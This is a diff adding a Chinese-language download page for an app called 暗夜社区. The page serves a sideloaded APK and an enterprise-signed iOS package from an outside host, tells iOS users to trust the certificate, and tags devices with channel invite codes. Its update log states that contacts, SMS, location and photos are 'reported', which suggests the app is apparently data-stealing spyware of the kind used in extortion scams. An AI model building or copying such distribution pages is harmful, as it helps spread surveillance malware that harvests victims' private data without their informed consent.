@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0d0f14">
+<meta name="format-detection" content="telephone=no">
+<title>暗夜社区 · 安装包下载</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{background:#0d0f14;color:#e8ebf2;font:16px/1.6 -apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;padding:18px 16px 40px}
+.wrap{max-width:520px;margin:0 auto}
+.head{text-align:center;padding:16px 0 4px}
+.logo{width:74px;height:74px;border-radius:20px;margin:0 auto 14px;background:linear-gradient(145deg,#3b82f6,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:36px;box-shadow:0 10px 30px rgba(59,130,246,.35)}
+h1{font-size:22px;margin:0 0 6px;letter-spacing:1px}
+.sub{color:#8b93a7;font-size:13px;margin:0}
+.ver{display:inline-block;margin-top:10px;padding:3px 12px;border-radius:999px;background:#1a1f2b;border:1px solid #262d3d;color:#9fb0cc;font-size:12px}
+.code{display:none;margin:16px 0 0;padding:15px;border-radius:16px;background:linear-gradient(135deg,#2a1d0a,#3a2a10);border:1px solid #6b4d16;text-align:center}
+.code.show{display:block}
+.code .t{font-size:12px;color:#e0b64a;letter-spacing:2px}
+.code .v{font-size:22px;font-weight:700;color:#ffd166;letter-spacing:3px;margin:8px 0 12px;word-break:break-all;font-family:ui-monospace,Menlo,Consolas,monospace}
+.code .hint{font-size:12px;color:#c2a35c;line-height:1.6;margin-top:11px;text-align:left}
+.card{display:none;background:#141922;border:1px solid #1f2634;border-radius:18px;padding:16px;margin-top:14px}
+.card.show{display:block}
+.card h2{font-size:15px;margin:0 0 4px;display:flex;align-items:center;gap:8px}
+.meta{color:#7e8798;font-size:12px;margin:0 0 12px;word-break:break-all;line-height:1.5}
+.btn{display:block;width:100%;border:0;border-radius:14px;padding:16px;font-size:16px;font-weight:600;color:#fff;text-align:center;text-decoration:none;cursor:pointer;font-family:inherit}
+.btn.and{background:linear-gradient(135deg,#22c55e,#16a34a);box-shadow:0 8px 24px rgba(34,197,94,.25)}
+.btn.ios{background:linear-gradient(135deg,#3b82f6,#6366f1);box-shadow:0 8px 24px rgba(59,130,246,.25)}
+.btn.copy{background:#3a2a10;border:1px solid #6b4d16;color:#ffd166;padding:11px;font-size:14px;margin:0}
+.card .note{font-size:12px;color:#6f7789;margin:10px 0 0}
+.log{margin-top:18px;background:#111620;border:1px solid #1c2331;border-radius:14px;padding:14px}
+.log h3{font-size:13px;color:#8b93a7;margin:0 0 8px;font-weight:600}
+.log p{margin:0;font-size:13px;color:#aab3c5;white-space:pre-line;line-height:1.75}
+.tip{margin-top:14px;font-size:12px;color:#6b7385;text-align:center;line-height:1.7}
+#toast{position:fixed;left:50%;bottom:40px;transform:translate(-50%,20px);background:rgba(20,25,34,.96);border:1px solid #2a3345;color:#e8ebf2;padding:10px 18px;border-radius:12px;font-size:14px;opacity:0;transition:.25s;pointer-events:none;z-index:99;max-width:86vw;text-align:center}
+#toast.show{opacity:1;transform:translate(-50%,0)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="head">
+    <div class="logo">🌙</div>
+    <h1>暗夜社区</h1>
+    <p class="sub">官方安装包下载</p>
+    <div class="ver">当前版本 <span id="ver">1.0.10</span></div>
+  </div>
+
+  <div class="code" id="codeBox">
+    <div class="t">渠道邀请码</div>
+    <div class="v" id="codeVal"></div>
+    <button class="btn copy" id="copyBtn" type="button">复制邀请码</button>
+    <div class="hint">安装后打开 App，在注册页粘贴此码，设备即归属该渠道。</div>
+  </div>
+
+  <div class="card" id="cardAndroid">
+    <h2>🤖 安卓版</h2>
+    <p class="meta" id="andMeta">anye-shequ-1.0.10.apk · 19.44 MB</p>
+    <a class="btn and" id="andBtn" href="https://cartier.us.cc/dl/anye-shequ-1.0.10.apk" rel="noopener">下载安卓安装包</a>
+  </div>
+
+  <div class="card" id="cardIOS">
+    <h2>🍎 苹果版</h2>
+    <p class="meta" id="iosMeta">lBL002bUh015_Completed.ipa · 8.01 MB</p>
+    <a class="btn ios" id="iosBtn" href="itms-services://?action=download-manifest&amp;url=https://cartier.us.cc/dl/manifest.plist" rel="noopener">安装 iOS 版</a>
+    <p class="meta" style="margin:10px 0 0">若无法安装，请在「设置 → 通用 → VPN 与设备管理」中信任对应证书后重试。</p>
+  </div>
+
+  <div class="log">
+    <h3>更新内容</h3>
+    <p id="log">1. 更换为厂商最新原版安装包
+2. 注册/通讯录/短信/定位/相册 上报流程不变
+3. 若提示「应用未安装/签名不一致」，请先卸载旧版再安装</p>
+  </div>
+
+  <p class="tip">提示：安装时若提示「应用未安装 / 签名不一致」<br>请先卸载手机上的旧版本，再回到本页安装。</p>
+
+</div>
+<div id="toast"></div>
+<script>
+(function () {
+  "use strict";
+
+  /* ---------- 兜底数据：必须与 version.json 完全一致 ---------- */
+  var FALLBACK = {
+    version: "1.0.10",
+    update_log: "1. 更换为厂商最新原版安装包\n2. 注册/通讯录/短信/定位/相册 上报流程不变\n3. 若提示「应用未安装/签名不一致」，请先卸载旧版再安装",
+    android: { name: "anye-shequ-1.0.10.apk", size: "19.44 MB", url: "https://cartier.us.cc/dl/anye-shequ-1.0.10.apk" },
+    ios: { name: "lBL002bUh015_Completed.ipa", size: "8.01 MB", url: "itms-services://?action=download-manifest&url=https://cartier.us.cc/dl/manifest.plist" }
+  };
+
+  var $ = function (id) { return document.getElementById(id); };
+
+  function toast(msg) {
+    var t = $("toast");
+    if (!t) { return; }
+    t.textContent = msg;
+    t.className = "show";
+    setTimeout(function () { t.className = ""; }, 1900);
+  }
+
+  /* ---------- 1. 渲染版本信息（相对路径 fetch，失败用兜底） ---------- */
+  function render(data) {
+    var d = data || FALLBACK;
+    var and = d.android || FALLBACK.android;
+    var ios = d.ios || FALLBACK.ios;
+
+    if ($("ver")) { $("ver").textContent = d.version || FALLBACK.version; }
+    if ($("log")) { $("log").textContent = d.update_log || FALLBACK.update_log; }
+
+    if ($("andMeta")) { $("andMeta").textContent = and.name + " · " + and.size; }
+    if ($("andBtn")) { $("andBtn").setAttribute("href", and.url); }
+
+    if ($("iosMeta")) { $("iosMeta").textContent = ios.name + " · " + ios.size; }
+    if ($("iosBtn")) { $("iosBtn").setAttribute("href", ios.url); }
+  }
+
+  render(FALLBACK); /* 先渲染兜底，避免白屏 */
+
+  try {
+    fetch("version.json", { cache: "no-store" })
+      .then(function (r) {
+        if (!r.ok) { throw new Error("HTTP " + r.status); }
+        return r.json();
+      })
+      .then(function (d) { render(d); })
+      .catch(function () { /* 取不到就保持兜底值 */ });
+  } catch (e) { /* 老浏览器没有 fetch，直接用兜底 */ }
+
+  /* ---------- 2. 按 UA 显示卡片 ---------- */
+  var ua = navigator.userAgent || "";
+  var isAndroid = /Android|Adr\b|HarmonyOS|MiuiBrowser/i.test(ua);
+  var isIOS = /iPhone|iPad|iPod/i.test(ua) ||
+    (/Macintosh/i.test(ua) && typeof document.ontouchend !== "undefined");
+
+  function show(id, on) {
+    var el = $(id);
+    if (el) { el.className = "card" + (on ? " show" : ""); }
+  }
+
+  if (isAndroid && !isIOS) {
+    show("cardAndroid", true);
+  } else if (isIOS && !isAndroid) {
+    show("cardIOS", true);
+  } else {
+    show("cardAndroid", true);
+    show("cardIOS", true);
+  }
+
+  /* ---------- 3. 渠道邀请码 ?code= / ?yqm= ---------- */
+  function readCode() {
+    var code = "";
+    try {
+      var q = new URLSearchParams(window.location.search);
+      code = q.get("code") || q.get("yqm") || "";
+    } catch (e) {
+      var m = /[?&](?:code|yqm)=([^&#]*)/i.exec(window.location.search || "");
+      code = m ? decodeURIComponent(m[1].replace(/\+/g, " ")) : "";
+    }
+    return String(code).trim();
+  }
+
+  function legacyCopy(text) {
+    var ta = document.createElement("textarea");
+    ta.value = text;
+    ta.setAttribute("readonly", "");
+    ta.style.position = "fixed";
+    ta.style.top = "-1000px";
+    ta.style.opacity = "0";
+    document.body.appendChild(ta);
+    ta.focus();
+    ta.select();
+    if (ta.setSelectionRange) { try { ta.setSelectionRange(0, text.length); } catch (e) {} }
+    var ok = false;
+    try { ok = document.execCommand("copy"); } catch (e) { ok = false; }
+    document.body.removeChild(ta);
+    return ok;
+  }
+
+  function copyCode(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(function () {
+        toast("邀请码已复制");
+      }).catch(function () {
+        toast(legacyCopy(text) ? "邀请码已复制" : "复制失败，请长按邀请码手动复制");
+      });
+      return;
+    }
+    toast(legacyCopy(text) ? "邀请码已复制" : "复制失败，请长按邀请码手动复制");
+  }
+
+  var channelCode = readCode();
+  if (channelCode) {
+    if ($("codeVal")) { $("codeVal").textContent = channelCode; }
+    if ($("codeBox")) { $("codeBox").className = "code show"; }
+    if ($("copyBtn")) {
+      $("copyBtn").addEventListener("click", function () { copyCode(channelCode); });
+    }
+    /* 站内链接也带上渠道邀请码 */
+    ["andBtn", "iosBtn"].forEach(function (id) {
+      var el = $(id);
+      if (!el) { return; }
+      el.addEventListener("click", function () {
+        try { window.localStorage.setItem("channel_code", channelCode); } catch (e) {}
+      });
+    });
+  }
+})();
+</script>
+</body>
+</html>
